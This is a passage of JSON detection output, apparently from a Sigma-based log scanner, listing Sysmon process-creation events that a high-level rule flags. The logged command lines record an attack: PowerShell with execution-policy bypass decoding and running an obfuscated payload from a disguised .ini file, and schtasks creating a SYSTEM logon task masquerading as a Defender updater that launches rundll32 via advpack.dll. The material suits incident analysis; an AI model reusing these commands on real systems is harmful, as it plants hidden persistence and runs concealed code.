                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F9B-6565-5B06-000000004800}; ProcessId=3488; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-1F5A-6565-5806-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=838D346D1D28F00783B7A6C6BD03A0DA,SHA256=8BE433049CCC271F04A8E625E9FB9BD3BCF15B4EDEB63497C00BD9CE1CD5C50E,IMPHASH=7EE4BC5589713B3470B8A950256E2E69; OriginalFileName=schtasks.exe; ParentImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=2052; CurrentDirectory=C:\\; CommandLine=\"C:\\Windows\\system32\\schtasks.exe\" /Create /RU system /SC ONLOGON /TN Microsoft\\WindowsDefenderUpdater /TR \"c:\\windows\\system32\\rundll32.exe advpack.dll,LaunchINFSection C:\\ProgramData\\EventManager.logs,Defender,1,\" /F; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\schtasks.exe; IntegrityLevel=Medium; ParentCommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; UtcTime=1701126043; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "a9278f03bce6b217a82c054a78cc6ea5acfebb4b16cd25b7d6cd842bb1dcfd8f",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Schtasks Creation Or Modification With SYSTEM Privileges",
                                                                       "rule_description":  "Detects the creation or update of a scheduled task to run with \"NT AUTHORITY\\SYSTEM\" privileges",
                                                                       "rule_author":  "Nasreddine Bencherchali (Nextron Systems)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F52-6565-5506-000000004800}; ProcessId=1848; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3008-6538-5400-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4064; CurrentDirectory=c:\\; CommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%%3) -eq 0){while($v -ne 0){$vv=$v%%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding; UtcTime=1701125970; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F5A-6565-5806-000000004800}; ProcessId=2052; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3008-6538-5400-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4064; CurrentDirectory=c:\\; CommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%%3) -eq 0){while($v -ne 0){$vv=$v%%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding; UtcTime=1701125978; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F9E-6565-5D06-000000004800}; ProcessId=7116; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3008-6538-5400-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4064; CurrentDirectory=c:\\; CommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%%3) -eq 0){while($v -ne 0){$vv=$v%%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding; UtcTime=1701126046; RuleName=-}"
                                                                                             },
